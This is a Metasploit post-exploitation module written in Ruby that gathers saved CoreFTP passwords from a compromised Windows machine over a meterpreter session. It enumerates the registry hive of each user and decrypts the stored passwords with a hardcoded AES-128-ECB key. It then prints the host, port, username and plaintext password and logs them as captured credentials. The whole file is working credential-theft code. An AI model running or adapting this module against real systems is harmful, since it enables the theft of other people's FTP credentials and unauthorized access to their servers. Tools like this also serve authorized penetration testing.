##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
      'Description'   => %q{
        This module extracts saved passwords from the CoreFTP FTP client. These
      passwords are stored in the registry. They are encrypted with AES-128-ECB.
      This module extracts and decrypts these passwords.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      print_status("Looking at Key #{hive['HKU']}")
      begin
        subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
        if subkeys.nil? or subkeys.empty?
          print_status ("CoreFTP not installed for this user.")
          next
        end

        subkeys.each do |site|
          site_key = "#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}"
          host = registry_getvaldata(site_key, "Host") || ""
          user = registry_getvaldata(site_key, "User") || ""
          port = registry_getvaldata(site_key, "Port") || ""
          epass = registry_getvaldata(site_key, "PW")
          next if epass == nil or epass == ""
          pass = decrypt(epass)
          pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
          print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
          if session.db_record
            source_id = session.db_record.id
          else
            source_id = nil
          end
          auth =
            {
              :host => host,
              :port => port,
              :sname => 'ftp',
              :user => user,
              :pass => pass,
              :type => 'password',
              :source_id => source_id,
              :source_type => "exploit",
              :active => true
            }
          report_auth_info(auth)
        end
      rescue
        print_error("Cannot Access User SID: #{hive['HKU']}")
      end
    end
    unload_our_hives(userhives)
  end

  def decrypt(encoded)
    cipher = [encoded].pack("H*")
    aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
    aes.padding = 0
    aes.decrypt
    aes.key = "hdfzpysvpzimorhk"
    password = (aes.update(cipher) + aes.final).gsub(/\x00/,'')
    return password
  end
end
